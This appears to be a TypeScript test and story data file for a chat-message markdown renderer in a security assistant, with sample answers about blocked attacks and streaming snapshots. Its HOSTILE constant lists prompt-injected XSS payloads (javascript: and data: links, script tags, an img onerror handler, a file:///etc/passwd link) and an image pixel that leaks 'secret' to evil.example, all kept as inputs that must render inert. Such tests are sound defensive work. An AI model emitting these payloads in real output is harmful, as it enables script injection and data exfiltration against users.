/** Story and test data for `AssistantMessageMarkdown` (not published). */

/** A full Wally answer that touches every default element. */
export const WALLY_ANSWER = `## Attacks on \`/api/login\`

Found **3 attacks** in the last 24 hours, all *blocked*. The top source is \`203.0.113.7\` &amp; friends.

| IP | Type | Hits |
|:---|:----:|-----:|
| 203.0.113.7 | sqli | 120 |
| 198.51.100.4 | xss | 9 |
| 192.0.2.10 | brute | 5 |

1. Check the rule:
   - \`rule_id: 1042\`
   - mode ~~monitoring~~ blocking
2. Add a rule:

\`\`\`json
{
  "action": "block",
  "ip": "203.0.113.7",
  "ttl": 3600
}
\`\`\`

> Rules apply within 1 minute.

- [x] Denylisted
- [ ] Notified

---

See [Wallarm docs](https://docs.wallarm.com/admin-en/configure-parameters-en/) or <https://console.wallarm.com>.`;

/** Reasoning text for the chain-of-thought variant (Figma 494:4292). */
export const COT_TEXT = `The user asks why \`/api/login\` gets so many hits.

#### Plan

- Group the blocked requests by source IP.
- Check whether \`203.0.113.0/24\` is already denylisted.

The rule \`rule_id: 1042\` is in monitoring mode, so nothing is blocked yet. See [the rule](https://my.wallarm.com/rules/1042).`;

/** Prompt-injected answer: every line must render inert. */
export const HOSTILE = `Click [here](javascript:alert(1)) or [there](JaVaScRiPt:alert(1)) or [data](data:text/html,<script>alert(1)</script>).

<script>alert(1)</script>

Inline <img src=x onerror=alert(1)> and a pixel ![pixel](https://evil.example/p.gif?q=secret).

[entity](javascript&colon;alert(1)) <javascript:alert(1)> [file](file:///etc/passwd) <a href="javascript:alert(1)">raw</a>`;

/** Mid-stream snapshots (addendum §1), rendered with `streaming` on. */
export const STREAMING_SNAPSHOTS = {
  t1: 'Looking at hits for `/api/lo',
  t4: 'Found **3 att',
  t4b: 'Found **',
  t5: 'Found:\n\n| IP | Type | Hits |\n|---|',
  t5c: 'Found:\n\n| IP | Type | Hits |\n|---|---|---|\n| 1.2.3.4 | sq',
  t6: '2. Add a rule:\n\n```yaml\nrule: block\nip: 1',
  t6b: '2. Add a rule:\n\n```ya',
  t7: 'See [docs](https',
} as const;
